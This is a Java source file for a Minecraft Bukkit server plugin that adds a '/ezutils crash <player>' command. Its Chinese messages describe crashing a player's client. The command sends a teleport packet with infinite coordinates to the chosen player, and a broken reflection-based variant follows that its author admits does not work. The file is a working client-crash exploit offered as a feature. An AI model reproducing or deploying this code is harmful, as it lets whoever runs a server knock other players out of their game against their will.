package me.nuymakstone.ezutils.command;

import com.google.common.collect.Sets;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Set;

import static org.bukkit.Bukkit.getServer;

public class CrashCommand extends AbstractCommand{

    /**
     * The name of the command.
     */
    public static final String NAME = "CrashCommand";

    /**
     * The description of the command.
     */
    public static final String DESCRIPTION = "崩溃玩家的客户端。";

    /**
     * The main permission of the command.
     */
    public static final String PERMISSION = "ezutils.crash";

    /**
     * The proper usage of the command.
     */
    public static final String USAGE = "/ezutils crash <player>";

    /**
     * The sub permissions of the command.
     */
    public static final String[] SUB_PERMISSIONS = {""};

    /**
     * Construct out object.
     *
     * @param sender the command sender
     */
    public CrashCommand(CommandSender sender) {
        super(sender, NAME, DESCRIPTION, PERMISSION, SUB_PERMISSIONS, USAGE);
    }

    /**
     * Execute the command.
     *  @param sender  the sender of the command
     * @param command the command being done
     * @param label   the name of the command
     * @param args    the arguments supplied
     * @return
     */

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        //ezutils crash player
        if (args.length == 1) {
            sender.sendMessage(ChatColor.translateAlternateColorCodes('&',"&b/ezutils crash <player>"));
            return true;
        }
        Player target = Bukkit.getPlayer(args[1]);
        if (target == null) {
            sender.sendMessage(ChatColor.translateAlternateColorCodes('&',"&c没有找到玩家"+args[1]));
            return true;
        }
        PacketPlayOutPosition packet = new PacketPlayOutPosition(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, Sets.newHashSet(Arrays.asList(PacketPlayOutPosition.EnumPlayerTeleportFlags.X, PacketPlayOutPosition.EnumPlayerTeleportFlags.Y, PacketPlayOutPosition.EnumPlayerTeleportFlags.X_ROT, PacketPlayOutPosition.EnumPlayerTeleportFlags.Y_ROT, PacketPlayOutPosition.EnumPlayerTeleportFlags.Z)));
        ((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
        sender.sendMessage(ChatColor.translateAlternateColorCodes('&',"&b已经成功崩溃此玩家的客户端"));
        return true;
    }
    /**
     * im trying to use the java reflection but idk how to get enum you can remove it
     *
     */

    private void sendPacket(Player player, Object packet) {
        try {
            Object handle = player.getClass().getMethod("getHandle").invoke(player);
            Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
            playerConnection.getClass().getMethod("sendPacket", getNMSClass("Packet")).invoke(playerConnection, packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private Class<?> getNMSClass(String name) {
        try {
            return Class.forName("net.minecraft.server."
                    + Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3] + "." + name);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    private Object getCrashPacket() {
        try {
            Class<?> PacketPlayOutPosition = getNMSClass("PacketPlayOutPosition");
            Class<?> PacketPlayOutPositionEnum = getNMSClass("PacketPlayOutPosition$EnumPlayerTeleportFlags");
            Set<?> a = Sets.newHashSet(getEnumValues(PacketPlayOutPositionEnum));
            if (a == null)
                return null;
            Object packet = PacketPlayOutPosition.getConstructor(
                    new Class<?>[] { double.class, double.class, double.class, float.class, float.class, Set.class })
                    .newInstance(Double.POSITIVE_INFINITY, 0, Double.POSITIVE_INFINITY, 90F, 0F, a);
            return packet;
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return null;
    }

    // https://www.logicbig.com/how-to/code-snippets/jcode-reflection-values-field-in-enum.html
    @SuppressWarnings({ "rawtypes", "unchecked" })
    private static <E extends Enum> E[] getEnumValues(Class<?> enumClass) {
        Object o = null;
        try {
            // Field f = enumClass.getDeclaredField("$VALUES");
            Field f = enumClass.getDeclaredField("getDefaultValue");
            f.setAccessible(true);
            o = f.get(null);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return (E[]) o;
    }

}
